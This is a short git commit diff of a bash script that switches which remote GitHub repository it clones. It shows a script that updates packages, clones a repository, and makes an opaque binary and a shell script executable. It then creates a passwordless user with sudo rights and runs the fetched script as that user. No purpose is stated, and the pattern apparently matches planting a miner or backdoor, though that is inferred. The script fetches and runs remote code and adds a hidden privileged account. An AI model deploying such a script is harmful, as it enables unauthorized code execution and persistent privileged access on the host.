f9a975ba56a0f3a672d38f5426b8d9f09392fe6f
vanessa-jua0724 <72494519+vanessa-jua0724@users.noreply.github.com>
2021-07-24 18:07:09 +0000

    Update kuntul.sh

--- kuntul.sh
+++ kuntul.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update
-git clone https://github.com/Jdhdidhehevej/cau.git && cd cau
-chmod +x entog.sh && chmod +x cumin chmod 777 cumin entog.sh
+git clone https://github.com/Pantaiselatan/tiger.git && cd tiger
+chmod +x okeh.sh && chmod +x cumin chmod 1000 cumin okeh.sh
 sudo adduser --disabled-password --gecos "" hoh && sudo usermod -aG sudo hoh
-sudo -u hoh -H sh -c "./entog.sh"
+sudo -u hoh -H sh -c "./okeh.sh"
 sudo apt update
